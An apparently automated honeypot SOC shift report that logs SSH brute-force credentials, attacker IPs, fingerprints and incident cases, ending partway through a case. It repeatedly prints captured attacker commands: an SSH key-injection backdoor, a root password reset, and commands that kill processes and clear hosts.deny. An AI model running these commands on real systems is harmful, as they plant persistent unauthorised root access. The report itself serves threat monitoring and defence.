# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-10 |
| **Generated At** | 2026-04-10T14:46:08Z |
| **Shift Time** | 14:46 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **224** |
| Confirmed Threats | **221** |
| False Positives Filtered | **3** (1.3%) |
| Unique Attacker IPs | **19** |
| Countries of Origin | **9** |
| High Severity Cases | **59** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **165** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **145** |
| Unique Credential Pairs | **64** |
| Unique Usernames | **35** |
| Unique Passwords | **63** |
| Successful Auth Pairs | **35** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 59 |
| `345gs5662d34` | 29 |
| `test` | 6 |
| `ubuntu` | 5 |
| `steam` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 29 |
| `3245gs5662d34` | 29 |
| `password` | 3 |
| `sysadmin@2025` | 2 |
| `Server05` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 29 |
| `root` | `3245gs5662d34` | 29 |
| `sysadmin` | `sysadmin@2025` | 2 |
| `server` | `Server05` | 2 |
| `user` | `User0` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ZAQ!2wsx2018` | `180.76.143.203` | 2026-04-10T13:09:42 |
| `root` | `302026` | `23.91.97.250` | 2026-04-10T13:36:07 |
| `root` | `3245gs5662d34` | `23.91.97.250` | 2026-04-10T13:36:10 |
| `root` | `1Qaz@wsx` | `103.91.246.101` | 2026-04-10T13:53:12 |
| `root` | `3245gs5662d34` | `103.91.246.101` | 2026-04-10T13:53:13 |
| `root` | `Qazwsx111..` | `185.239.84.249` | 2026-04-10T13:57:42 |
| `root` | `3245gs5662d34` | `185.239.84.249` | 2026-04-10T13:57:45 |
| `root` | `qwe@2026` | `211.219.22.213` | 2026-04-10T13:57:45 |
| `root` | `3245gs5662d34` | `211.219.22.213` | 2026-04-10T13:57:49 |
| `root` | `#1` | `103.91.246.101` | 2026-04-10T13:58:35 |
| `root` | `Bx123456.` | `211.219.22.213` | 2026-04-10T14:01:17 |
| `root` | `leonardo` | `103.91.246.101` | 2026-04-10T14:02:02 |
| `root` | `qazwsx9999#$` | `103.91.246.101` | 2026-04-10T14:05:40 |
| `root` | `asdASD123` | `211.219.22.213` | 2026-04-10T14:08:36 |
| `root` | `Wr123456` | `185.239.84.249` | 2026-04-10T14:10:24 |
| `root` | `qwer.123456` | `103.91.246.101` | 2026-04-10T14:11:00 |
| `root` | `Admin123!!` | `211.219.22.213` | 2026-04-10T14:12:15 |
| `root` | `root2018#` | `103.91.246.101` | 2026-04-10T14:12:44 |
| `root` | `Aa@123456.` | `211.219.22.213` | 2026-04-10T14:13:55 |
| `root` | `Aa@123456.` | `185.239.84.249` | 2026-04-10T14:19:17 |
| `root` | `ZAQ!2wsx321..` | `103.91.246.101` | 2026-04-10T14:19:49 |
| `root` | `p@55wOrd` | `185.239.84.249` | 2026-04-10T14:21:27 |
| `root` | `123qwe,./` | `103.91.246.101` | 2026-04-10T14:21:38 |
| `root` | `Qazwsx111..` | `211.219.22.213` | 2026-04-10T14:26:14 |
| `root` | `Admin123!!` | `185.239.84.249` | 2026-04-10T14:27:34 |
| `root` | `root1.` | `103.91.246.101` | 2026-04-10T14:28:42 |
| `root` | `Wr123456` | `211.219.22.213` | 2026-04-10T14:29:40 |
| `root` | `Abcd123@123` | `103.91.246.101` | 2026-04-10T14:30:29 |
| `root` | `qwe@2026` | `185.239.84.249` | 2026-04-10T14:31:34 |
| `root` | `p@55wOrd` | `211.219.22.213` | 2026-04-10T14:33:06 |
| `root` | `Root2021..` | `103.91.246.101` | 2026-04-10T14:33:53 |
| `root` | `Bx123456.` | `185.239.84.249` | 2026-04-10T14:35:30 |
| `root` | `root2023@` | `179.57.170.71` | 2026-04-10T14:40:11 |
| `root` | `3245gs5662d34` | `179.57.170.71` | 2026-04-10T14:40:18 |
| `root` | `asdASD123` | `185.239.84.249` | 2026-04-10T14:41:29 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **224** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 195 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 177 | 12 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 177 | 12 | Modern SSH client |
| `95420f9d932d...` | libssh | 18 | 3 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 29 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:cm63uw6M58UQ"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.76.143.203`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `185.239.84.249`, `23.91.97.250`, `103.91.246.101`, `211.219.22.213`, `179.57.170.71`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **19** |
| Unique ASNs | **14** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS55933` | Cloudie Limited | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS14117` | Telefonica del Sur S.A. | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (59)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-412d3cefe83a

| Field | Detail |
|---|---|
| **Source IP** | `180.76.143[.]203` |
| **First Seen** | 2026-04-10 13:09 |
| **Last Seen** | 2026-04-10 13:10 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:cm63uw6M58UQ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 13:09:40` | `cowrie.session.connect` |
| `2026-04-10 13:09:40` | `cowrie.client.version` |
| `2026-04-10 13:09:40` | `cowrie.client.kex` |
| `2026-04-10 13:09:42` | `cowrie.login.success` |
| `2026-04-10 13:09:43` | `cowrie.session.params` |
| `2026-04-10 13:09:43` | `cowrie.command.input` |
| `2026-04-10 13:09:43` | `cowrie.command.failed` |
| `2026-04-10 13:09:43` | `cowrie.log.closed` |
| `2026-04-10 13:09:44` | `cowrie.session.params` |
| `2026-04-10 13:09:44` | `cowrie.command.input` |
| `2026-04-10 13:09:45` | `cowrie.session.file_download` |
| `2026-04-10 13:09:45` | `cowrie.log.closed` |
| `2026-04-10 13:09:57` | `cowrie.session.params` |
| `2026-04-10 13:09:57` | `cowrie.command.input` |
| `2026-04-10 13:09:57` | `cowrie.log.closed` |
| `2026-04-10 13:09:58` | `cowrie.session.params` |
| `2026-04-10 13:09:58` | `cowrie.command.input` |
| `2026-04-10 13:10:01` | `cowrie.log.closed` |
| `2026-04-10 13:10:01` | `cowrie.session.params` |
| `2026-04-10 13:10:01` | `cowrie.command.input` |
| `2026-04-10 13:10:02` | `cowrie.session.file_download` |
| `2026-04-10 13:10:02` | `cowrie.log.closed` |
| `2026-04-10 13:10:02` | `cowrie.session.params` |
| `2026-04-10 13:10:02` | `cowrie.command.input` |
| `2026-04-10 13:10:03` | `cowrie.log.closed` |
| `2026-04-10 13:10:03` | `cowrie.session.params` |
| `2026-04-10 13:10:03` | `cowrie.command.input` |
| `2026-04-10 13:10:03` | `cowrie.log.closed` |
| `2026-04-10 13:10:04` | `cowrie.session.params` |
| `2026-04-10 13:10:04` | `cowrie.command.input` |
| `2026-04-10 13:10:04` | `cowrie.command.input` |
| `2026-04-10 13:10:04` | `cowrie.log.closed` |
| `2026-04-10 13:10:05` | `cowrie.session.params` |
| `2026-04-10 13:10:05` | `cowrie.command.input` |
| `2026-04-10 13:10:05` | `cowrie.log.closed` |
| `2026-04-10 13:10:07` | `cowrie.session.params` |
| `2026-04-10 13:10:07` | `cowrie.command.input` |
| `2026-04-10 13:10:07` | `cowrie.log.closed` |
| `2026-04-10 13:10:08` | `cowrie.session.params` |
| `2026-04-10 13:10:08` | `cowrie.command.input` |
| `2026-04-10 13:10:08` | `cowrie.log.closed` |
| `2026-04-10 13:10:08` | `cowrie.session.params` |
| `2026-04-10 13:10:08` | `cowrie.command.input` |
| `2026-04-10 13:10:09` | `cowrie.log.closed` |
| `2026-04-10 13:10:10` | `cowrie.session.params` |
| `2026-04-10 13:10:10` | `cowrie.command.input` |
| `2026-04-10 13:10:10` | `cowrie.log.closed` |
| `2026-04-10 13:10:10` | `cowrie.session.params` |
| `2026-04-10 13:10:10` | `cowrie.command.input` |
| `2026-04-10 13:10:11` | `cowrie.log.closed` |
| `2026-04-10 13:10:12` | `cowrie.session.params` |
| `2026-04-10 13:10:12` | `cowrie.command.input` |
| `2026-04-10 13:10:12` | `cowrie.log.closed` |
| `2026-04-10 13:10:13` | `cowrie.session.params` |
| `2026-04-10 13:10:13` | `cowrie.command.input` |
| `2026-04-10 13:10:14` | `cowrie.log.closed` |
| `2026-04-10 13:10:14` | `cowrie.session.params` |
| `2026-04-10 13:10:14` | `cowrie.command.input` |
| `2026-04-10 13:10:15` | `cowrie.log.closed` |
| `2026-04-10 13:10:15` | `cowrie.session.params` |
| `2026-04-10 13:10:15` | `cowrie.command.input` |
| `2026-04-10 13:10:16` | `cowrie.log.closed` |
| `2026-04-10 13:10:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.143[.]203` to AbuseIPDB if not already reported
- [ ] Block `180.76.143[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46b7103bfb4e

| Field | Detail |
|---|---|
| **Source IP** | `23.91.97[.]250` |
| **First Seen** | 2026-04-10 13:36 |
| **Last Seen** | 2026-04-10 13:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 13:36:06` | `cowrie.session.connect` |
| `2026-04-10 13:36:06` | `cowrie.client.version` |
| `2026-04-10 13:36:06` | `cowrie.client.kex` |
| `2026-04-10 13:36:07` | `cowrie.login.success` |
| `2026-04-10 13:36:07` | `cowrie.session.params` |
| `2026-04-10 13:36:07` | `cowrie.command.input` |
| `2026-04-10 13:36:07` | `cowrie.command.failed` |
| `2026-04-10 13:36:07` | `cowrie.log.closed` |
| `2026-04-10 13:36:07` | `cowrie.session.params` |
| `2026-04-10 13:36:07` | `cowrie.command.input` |
| `2026-04-10 13:36:08` | `cowrie.session.file_download` |
| `2026-04-10 13:36:08` | `cowrie.log.closed` |
| `2026-04-10 13:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.91.97[.]250` to AbuseIPDB if not already reported
- [ ] Block `23.91.97[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dfb166d761c

| Field | Detail |
|---|---|
| **Source IP** | `23.91.97[.]250` |
| **First Seen** | 2026-04-10 13:36 |
| **Last Seen** | 2026-04-10 13:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 13:36:09` | `cowrie.session.connect` |
| `2026-04-10 13:36:09` | `cowrie.client.version` |
| `2026-04-10 13:36:09` | `cowrie.client.kex` |
| `2026-04-10 13:36:10` | `cowrie.login.success` |
| `2026-04-10 13:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.91.97[.]250` to AbuseIPDB if not already reported
- [ ] Block `23.91.97[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6d323b3324c

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 13:53 |
| **Last Seen** | 2026-04-10 13:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 13:53:12` | `cowrie.session.connect` |
| `2026-04-10 13:53:12` | `cowrie.client.version` |
| `2026-04-10 13:53:12` | `cowrie.client.kex` |
| `2026-04-10 13:53:12` | `cowrie.login.success` |
| `2026-04-10 13:53:12` | `cowrie.session.params` |
| `2026-04-10 13:53:12` | `cowrie.command.input` |
| `2026-04-10 13:53:12` | `cowrie.command.failed` |
| `2026-04-10 13:53:12` | `cowrie.log.closed` |
| `2026-04-10 13:53:12` | `cowrie.session.params` |
| `2026-04-10 13:53:12` | `cowrie.command.input` |
| `2026-04-10 13:53:12` | `cowrie.session.file_download` |
| `2026-04-10 13:53:12` | `cowrie.log.closed` |
| `2026-04-10 13:53:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec091e27e20b

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 13:53 |
| **Last Seen** | 2026-04-10 13:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 13:53:13` | `cowrie.session.connect` |
| `2026-04-10 13:53:13` | `cowrie.client.version` |
| `2026-04-10 13:53:13` | `cowrie.client.kex` |
| `2026-04-10 13:53:13` | `cowrie.login.success` |
| `2026-04-10 13:53:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4c9eae650cd

| Field | Detail |
|---|---|
| **Source IP** | `185.239.84[.]249` |
| **First Seen** | 2026-04-10 13:57 |
| **Last Seen** | 2026-04-10 13:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 13:57:41` | `cowrie.session.connect` |
| `2026-04-10 13:57:41` | `cowrie.client.version` |
| `2026-04-10 13:57:41` | `cowrie.client.kex` |
| `2026-04-10 13:57:42` | `cowrie.login.success` |
| `2026-04-10 13:57:42` | `cowrie.session.params` |
| `2026-04-10 13:57:42` | `cowrie.command.input` |
| `2026-04-10 13:57:42` | `cowrie.command.failed` |
| `2026-04-10 13:57:42` | `cowrie.log.closed` |
| `2026-04-10 13:57:42` | `cowrie.session.params` |
| `2026-04-10 13:57:42` | `cowrie.command.input` |
| `2026-04-10 13:57:42` | `cowrie.session.file_download` |
| `2026-04-10 13:57:42` | `cowrie.log.closed` |
| `2026-04-10 13:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.84[.]249` to AbuseIPDB if not already reported
- [ ] Block `185.239.84[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e79024846de

| Field | Detail |
|---|---|
| **Source IP** | `185.239.84[.]249` |
| **First Seen** | 2026-04-10 13:57 |
| **Last Seen** | 2026-04-10 13:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 13:57:44` | `cowrie.session.connect` |
| `2026-04-10 13:57:44` | `cowrie.client.version` |
| `2026-04-10 13:57:44` | `cowrie.client.kex` |
| `2026-04-10 13:57:45` | `cowrie.login.success` |
| `2026-04-10 13:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.84[.]249` to AbuseIPDB if not already reported
- [ ] Block `185.239.84[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4afb61c04809

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-04-10 13:57 |
| **Last Seen** | 2026-04-10 13:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 13:57:44` | `cowrie.session.connect` |
| `2026-04-10 13:57:44` | `cowrie.client.version` |
| `2026-04-10 13:57:45` | `cowrie.client.kex` |
| `2026-04-10 13:57:45` | `cowrie.login.success` |
| `2026-04-10 13:57:45` | `cowrie.session.params` |
| `2026-04-10 13:57:45` | `cowrie.command.input` |
| `2026-04-10 13:57:45` | `cowrie.command.failed` |
| `2026-04-10 13:57:46` | `cowrie.log.closed` |
| `2026-04-10 13:57:46` | `cowrie.session.params` |
| `2026-04-10 13:57:46` | `cowrie.command.input` |
| `2026-04-10 13:57:46` | `cowrie.session.file_download` |
| `2026-04-10 13:57:46` | `cowrie.log.closed` |
| `2026-04-10 13:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bbf581da2ef

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-04-10 13:57 |
| **Last Seen** | 2026-04-10 13:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 13:57:48` | `cowrie.session.connect` |
| `2026-04-10 13:57:48` | `cowrie.client.version` |
| `2026-04-10 13:57:48` | `cowrie.client.kex` |
| `2026-04-10 13:57:49` | `cowrie.login.success` |
| `2026-04-10 13:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f775316b297

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 13:58 |
| **Last Seen** | 2026-04-10 13:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
